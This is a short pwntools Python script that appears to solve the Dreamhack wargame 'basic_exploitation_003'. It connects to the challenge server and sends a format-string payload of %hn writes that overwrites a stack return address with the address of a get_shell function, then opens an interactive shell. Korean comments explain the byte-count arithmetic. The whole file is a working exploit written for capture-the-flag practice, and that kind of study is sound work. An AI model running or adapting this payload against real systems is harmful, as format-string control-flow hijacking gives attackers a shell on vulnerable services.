from pwn import *

context.arch = "i386"

p = remote("host3.dreamhack.games", 12200)
elf = ELF("./basic_exploitation_003")

get_shell = elf.symbols['get_shell']
# get_shell = 0x8048669
# 0x0804 = 2052
# 0x8669 = 34409

return_addr = 0xffffd01c

# 이렇게 해버리면 stack_buf에 공백 2045개 + 32357개가 쌓여버림
# 메모리에 저 string이 입력되게 해야함
# 2052 - 7 = 2045
# 34409 - 2052 = 32357
payload = b"%2045c%7$hn"    # 11bytes
payload += b"%32357c%8$hn"  # 12bytes
payload += b"a"             # 여기까지 24bytes
payload += p32(return_addr + 2)
payload += p32(return_addr)

p.send(payload)
p.interactive()
